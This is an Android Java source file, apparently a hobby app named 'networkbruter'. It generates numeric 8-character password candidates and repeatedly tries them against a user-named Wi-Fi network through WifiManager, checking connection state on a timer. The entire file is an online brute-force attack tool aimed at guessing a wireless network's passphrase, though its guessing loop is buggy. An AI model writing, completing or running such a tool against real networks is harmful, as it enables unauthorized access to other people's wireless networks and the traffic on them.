package com.u063.networkbruter;

import android.content.Context;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.util.ArrayList;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
        //connectToWifi("TP","21111111");
    }
    String netName;
    ArrayList<String> passwords = new ArrayList<>();
    public void bruter(View w){
        TextView tv=findViewById(R.id.text);
        EditText te = findViewById(R.id.name);
        netName=te.getText().toString();
        tv.setText(netName);
        Handler handler = new Handler(){
            @Override
            public void handleMessage(Message msg) {
                Bundle bundle = msg.getData();
                String data = bundle.getString("pass");
                TextView infoTextView =
                        (TextView) findViewById(R.id.text);
                //infoTextView.setText(data);
                passwords.add(""+data);
                //connectToWifi("TP", data);
            }
        };
        EditText et=findViewById(R.id.setTimeoutBrut);
        int eti=Integer.parseInt(et.getText().toString());
        Thread myThread = new Thread(new Runnable() {
            public void run() {
                String[] s = {"1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "$"};
                StringBuilder passInStr = new StringBuilder();
                int[] pass = new int[8];
                long endTime = System.currentTimeMillis() + eti;
                boolean isReturn = true;
                while (System.currentTimeMillis() < endTime) {
                //while(System.currentTimeMillis() + 10 * 20) {
                    if (isReturn == true) {
                        for (int z = 0; z < 11; z++) {
                            pass[0] = z;
                            passInStr.setLength(0);

                            for (int iz = 0; iz < 8; iz++) {
                                passInStr.append(s[pass[iz]]);
                            }

                            Message msg = handler.obtainMessage();
                            Bundle bundle = new Bundle();
                            bundle.putString("pass", passInStr.toString());
                            msg.setData(bundle);
                            handler.sendMessage(msg);
                            //boolean isReturn = false;
                            isReturn = true;
                            //isReturn = connectToWifi("TP", passInStr.toString());

                            for (int iz = 0; iz < 8; iz++) {
                                if (pass[iz] >= 10) {
                                    pass[iz] = 0;
                                    pass[iz + 1] += 1;
                                }
                            }
                        }
                    }
                }
            }
        });
        if(passwords.size()==0) {
            myThread.setPriority(Thread.MAX_PRIORITY);
            myThread.start();
        } else {

        }

    }
    public void check(View w){
        Timer timer = new Timer();
        Handler handler = new Handler(Looper.getMainLooper());
        EditText et=findViewById(R.id.setTimeout);
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                handler.post(new Runnable() {
                    @Override
                    public void run() {
                        // Здесь вызываем вашу функцию
                        conn();
                    }
                });
            }
        }, 0, Integer.parseInt(et.getText().toString())); // Здесь укажите интервал в миллисекундах (например, каждую секунду)

    }
    int correct=0;
    void conn(){
        ConnectivityManager connManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

        if (mWifi.isConnected()) {

        } else {
            correct += 1;
            connectToWifi(netName, passwords.get(correct));
            TextView infoTextView =
                    (TextView) findViewById(R.id.text);
            infoTextView.setText(passwords.get(correct));
        }
    }
    public void connectToWifi(String ssid, String key) {
        WifiManager wifiManager = (WifiManager) getSystemService(Context.WIFI_SERVICE);
        Log.e("TAG", "connection wifi pre Q");
        WifiConfiguration wifiConfig = new WifiConfiguration();
        wifiConfig.SSID = "\"" + ssid + "\"";
        wifiConfig.preSharedKey = "\"" + key + "\"";
        int netId = wifiManager.addNetwork(wifiConfig);

        if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            Toast t = Toast.makeText(this, "NON", Toast.LENGTH_SHORT);
            return;
        }
        List<WifiConfiguration> configuredNetworks = wifiManager.getConfiguredNetworks();
        for (WifiConfiguration config : configuredNetworks) {
            if (config.SSID.equals(wifiConfig.SSID)) {
                int networkId = config.networkId;
                // использование networkId
            }
        }

        wifiManager.disconnect();
        wifiManager.enableNetwork(netId, true);
        wifiManager.reconnect();
    }
}

